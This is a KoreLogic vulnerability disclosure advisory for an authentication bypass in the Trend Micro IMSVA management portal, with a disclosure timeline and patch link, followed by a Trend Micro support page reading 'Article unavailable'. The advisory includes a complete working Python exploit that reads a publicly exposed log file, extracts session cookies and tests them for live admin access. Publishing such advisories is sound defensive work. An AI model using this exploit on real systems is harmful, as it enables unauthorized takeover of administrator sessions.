=== Content from korelogic.com_eccd37ac_20250125_134331.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2018-006 : Trend Micro IMSVA Management Portal Authentication Bypass
Title: Trend Micro IMSVA Management Portal Authentication Bypass
Advisory ID: KL-001-2018-006
Publication Date: 2018.02.08
Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2018-006.txt
1. Vulnerability Details
Affected Vendor: Trend Micro
Affected Product: InterScan Mail Security Virtual Apppliance
Affected Version: 9.1.0.1600
Platform: Embedded Linux
CWE Classification: CWE-522: Insufficiently Protected Credentials, CWE-219: Sensitive Data Under Web Root
Impact: Authentication Bypass
Attack vector: HTTPS
2. Vulnerability Description
Any unauthenticated user can bypass the authentication process.
3. Technical Description
The web application is plugin-based and allows widgets to
be loaded into the application. A plugin which is loaded by
default stores a log file of events in a directory which can be
accessed by unauthenticated users. Files within this directory
(such as /widget/repository/log/diagnostic.log) which contain
cookie values can then be read, parsed, and session information
extracted. A functional exploit is shown below.
4. Mitigation and Remediation Recommendation
Trend Micro has released a Critical Patch update to the
affected versions for this vulnerability. The advisory and
links to the patch(es) are available from the following URL:
https://success.trendmicro.com/solution/1119277
5. Credit
This vulnerability was discovered by Matt Bergin (@thatguylevel)
of KoreLogic, Inc.
6. Disclosure Timeline
2017.08.11 - KoreLogic submits vulnerability details to Trend Micro.
2017.08.11 - Trend Micro confirms receipt.
2017.09.15 - KoreLogic asks for an update on the triage of the
reported issue.
2017.09.15 - Trend Micro informs KoreLogic that the issue is in
remediation but there is no expected release date yet.
2017.09.25 - 30 business days have elapsed since the vulnerability
was reported to Trend Micro.
2017.10.06 - Trend Micro informs KoreLogic that the issue will not
be addressed before the 45 business-day deadline. They
ask for additional time for the details to remain
embargoed in order to complete QA on the proposed fix.
2017.10.06 - KoreLogic agrees to extend the disclosure timeline.
2017.10.17 - 45 business days have elapsed since the vulnerability
was reported to Trend Micro.
2017.11.02 - Trend Micro notifies KoreLogic that the Critical Patch
for IMSVA 9.1 (Critical Patch 1682) has gone live,
but they are still working on the patch for IMSVA 9.0.
2017.11.07 - 60 business days have elapsed since the vulnerability
was reported to Trend Micro.
2017.12.21 - 90 business days have elapsed since the vulnerability
was reported to Trend Micro.
2017.12.28 - Trend Micro notifies KoreLogic that the IMSVA 9.0
Critical Patch is being localized for foreign language
customers. Expected release date is late January 2018.
2018.01.18 - Trend Micro notifies KoreLogic that the expected release
date for the IMSVA 9.0 Critical Patch and the advisory
is to be January 31, 2018.
2018.01.23 - 110 business days have elapsed since the vulnerability
was reported to Trend Micro.
2018.01.31 - Trend Micro releases the advisory associated with this
vulnerability and the related Critical Patches.
2018.02.08 - KoreLogic public disclosure.
7. Proof of Concept
#!/usr/bin/python3
from argparse import ArgumentParser
from ssl import \_create\_unverified\_context
from time import mktime
from urllib.request import HTTPSHandler, HTTPError, Request, urlopen, build\_opener
banner = '''Trendmicro IMSVA 9.1.0.1600 Management Portal Authentication Bypass
{}'''.format('-'\*67)
class Exploit:
def \_\_init\_\_(self, args):
self.target\_host = args.host
self.target\_port = args.port
self.list\_all = args.ls
self.sessions = []
self.session\_latest\_time = None
self.session\_latest\_id = None
self.sessions\_active = []
return None
def is\_target(self):
url\_loginpage = Request('https://{}:{}/loginPage.imss'.format(self.target\_host, self.target\_port))
url\_loginjsp = Request('https://{}:{}/jsp/framework/login.jsp'.format(self.target\_host, self.target\_port))
if urlopen(url\_loginpage, context=\_create\_unverified\_context()).getcode() == 200:
try:
urlopen(url\_loginjsp, context=\_create\_unverified\_context())
except HTTPError as e:
if e.code == 403:
return True
else:
return False
return False
def get\_sessions(self):
url\_vulnpage = Request('https://{}:{}/widget/repository/log/diagnostic.log'.format(self.target\_host, self.target\_port))
vuln\_obj = urlopen(url\_vulnpage, context=\_create\_unverified\_context())
if vuln\_obj.getcode() == 200:
vuln\_pagedata = vuln\_obj.read()
for line in vuln\_pagedata.decode('utf8').split('\n'):
if 'product\_auth' in line and 'JSEEEIONID' in line:
self.sessions.append((line.split(',')[0], line.split(',')[-1].split(' ')[1].split(':')[1]))
else:
return False
return True
def find\_latest(self):
for session in list(set(self.sessions)):
year, month, day = session[0].split(' ')[0].split('-')
hour, minute, second = session[0].split(' ')[1].split(':')
session\_time = mktime((int(year), int(month), int(day), int(hour), int(minute), int(second), 0, 0, 0))
if self.session\_latest\_time is None:
self.session\_latest\_time = session\_time
if session\_time > self.session\_latest\_time:
self.session\_latest\_time = session\_time
self.session\_latest\_id = session[1]
if self.list\_all:
if self.is\_session\_alive():
self.sessions\_active.append((self.session\_latest\_time, self.session\_latest\_id))
return True
def is\_session\_alive(self):
url\_consolepage = Request('https://{}:{}/console.imss'.format(self.target\_host, self.target\_port))
opener = build\_opener(HTTPSHandler(context=\_create\_unverified\_context()))
opener.addheaders.append(('Cookie', 'JSESSIONID={}'.format(self.session\_latest\_id)))
console\_obj = opener.open(url\_consolepage)
if console\_obj.getcode() == 200:
console\_pagedata = console\_obj.read().decode('utf8')
if 'parent.location.href="/timeout.imss"' in console\_pagedata:
return False
else:
return False
return True
def run(self):
if self.is\_target():
if self.get\_sessions():
print('[-] Leaked {} sessions'.format(len(self.sessions)))
self.find\_latest()
if self.list\_all and self.sessions\_active:
print('[+] Active sessions leaked.')
sessions = []
for entry in list(set(self.sessions\_active)):
sessions.append(entry[1])
for session in list(set(sessions)):
print('Set-Cookie: JSESSIONID={}'.format(session))
elif self.is\_session\_alive():
print('[+] Active session leaked.')
print('Set-Cookie: JSESSIONID={}'.format(self.session\_latest\_id))
return True
else:
print('[-] {} sessions leaked but none are active.'.format(len(self.sessions)))
return False
else:
return False
else:
return False
return False
if \_\_name\_\_ == '\_\_main\_\_':
print(banner)
arg\_parser = ArgumentParser(add\_help=False)
arg\_parser.add\_argument('-H', '--help', action='help', help='Help')
arg\_parser.add\_argument('-h', '--host', default=None, required=True, help='Target host')
arg\_parser.add\_argument('-p', '--port', default=8445, type=int, help='Target port')
arg\_parser.add\_argument('-l', '--ls', action='store\_true', default=False, help='List all sessions (noisy)')
args = arg\_parser.parse\_args()
Exploit(args).run()
The contents of this advisory are copyright(c) 2018
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
-----BEGIN PGP SIGNATURE-----
iQFOBAEBCAA4FiEE+cSrtp5jQJEtra70TWWaLA4ZiQwFAlp88wYaHGRpc2Nsb3N1
cmVzQGtvcmVsb2dpYy5jb20ACgkQTWWaLA4ZiQzz3gf+K1kJ4xDYF1O5QUKZcugw
uzQt5Y00pppL+RmukhTSXtDdwZubfkTWjGo4X22rxYXsuHlgWo6ObcjmWYxCSHQh
q7F13nWmnTO+Zgg9fVwjk+HxLzGnoB5U4sVMgmjAZJAXL9ASOfkKd7DNpJYz5CrK
eIV29jyNJyfglBcJ9fuT/HovCvSn7zfwYRFAdr5DMkVilZA6tYAYZGQZwp3wlHsr
jQtWVC9+qO5zWhVmWjwqznr06wWXU+yaPW7ZgcrZ22jsOyB4LwQVaBbANZQdzuMm
j3gjXcRrfcy9O/PN1HvKj1II2c+92+bYhXyEgk+rLpQuSRYrU3ox6hkVs9NcuAiv
gQ==
=nzcU
-----END PGP SIGNATURE-----


=== Content from success.trendmicro.com_6b94de8d_20250125_134340.html ===


![web](https://content.powerapps.com/resource/powerappsportal/img/web.png)
You’re offline. This is a read only version of the page.
![close](https://content.powerapps.com/resource/powerappsportal/img/close.png)

[![Trend Micro Business Success Portal](/trendmicro_logo.webp)

Business Success](/)

* Products
* Resources
* [FAQ](/faq/)
* [Contact](/contactus/)

* [Log in](/SignIn)

#### Featured

Resources

---

* [Automation Center](https://automation.trendmicro.com/)
* [Education Portal](https://education.trendmicro.com/customer/learn)
* [Online Help Center](https://docs.trendmicro.com/en-US/documentation/)
* [Service Status](https://status.trendmicro.com/s/)
* [TrendConnect](https://success.trendmicro.com/trendconnect/)

---

### Automation Center

Trend Micro Automation Center is a central hub for APIs and documentation across Trend Micro products. It offers searchable cross-product APIs and use cases for IT and security teams to automate tasks and improve efficiency.

[Learn more](https://automation.trendmicro.com/)

### Education Portal

The Education Portal serves as a comprehensive resource for Trend Micro employees to develop their professional capabilities. Through a variety of curated training modules, employees can deepen their understanding of company culture, product knowledge, processes, and essential soft skills.

[Learn more](https://education.trendmicro.com/customer/learn)

### Online Help Center

The Trend Micro Online Help Center provides customers with comprehensive product information and troubleshooting guidance. It offers general product usage information and in-depth solutions for complex issues.

[Learn more](https://docs.trendmicro.com/en-US/documentation/%20)

### Service Status

Trend Micro Service Status Portal provides real-time information on the performance of Trend Micro products. It offers up-to-date incident reports and historical data for monitoring system health.

[Learn more](https://status.trendmicro.com/s/)

### TrendConnect

TrendConnect is a mobile application that provides users with real-time insights into their Trend Micro security environment, including threat alerts and system health assessments.

[Learn more](/trendconnect)

* Products
* Resources
* + [Service Status](https://status.trendmicro.com/s/)
  + [Education Portal](https://education.trendmicro.com/customer/learn)
  + [Automation Center](https://automation.trendmicro.com/)
  + [Online Help Center](https://docs.trendmicro.com/en-US/documentation/%20)
  + [TrendConnect](/trendconnect)
* [FAQ](/faq/)
* [Contact](/contactus/)
* [Log in](/Signin)
* + [Dashboard](/dashboard/)
  + [Profile](/profile/)
  + [Switch Account](/switch-account)
  + [Logout](/Account/Login/LogOff)

* [Home](/)
* Article unavailable

# Article unavailable

The requested knowledge article is unavailable. Please contact your portal administrator.

Feedback

Send us your feedback!
How was your experience on this website?

Satisfied

Neutral

Poor

Cancel

Submit

Thank you for your feedback

##### Support & Help

* [FAQ](/en-US/faq/)
* [Contact by Sales](https://www.trendmicro.com/en_us/business/get-info-form.html)

##### Resources

* [Automation Center](https://automation.trendmicro.com/)
* [Download Center](http://downloadcenter.trendmicro.com/)
* [Education Portal](https://education.trendmicro.com/customer/learn)
* [Online Help Center](https://docs.trendmicro.com/en-US/documentation/)
* [Service Status](https://status.trendmicro.com/s/%20)
* [TrendConnect Mobile App](/trendconnect)

##### Policies & Vulnerability

* [Support Policies](/en-US/support-policy/)
* [Legal Policies & Privacy](https://www.trendmicro.com/en_us/about/legal.html)
* [Vulnerability Response](/en-US/vulnerability-response/)

##### About Trend

* [Trend Micro](https://www.trendmicro.com/en_us/business.html)
* [Home & Home Office Support](https://helpcenter.trendmicro.com/en-us/)
* [Partner Portal](https://community-trendmicro.force.com/Gpartner/s/login/?language=en_US)
* [Trend Micro YouTube Channel](https://www.youtube.com/channel/UCyRUBssUwx5mpUM7ctVNr-A)

Copyright ©  Trend Micro Incorporated. All rights reserved.


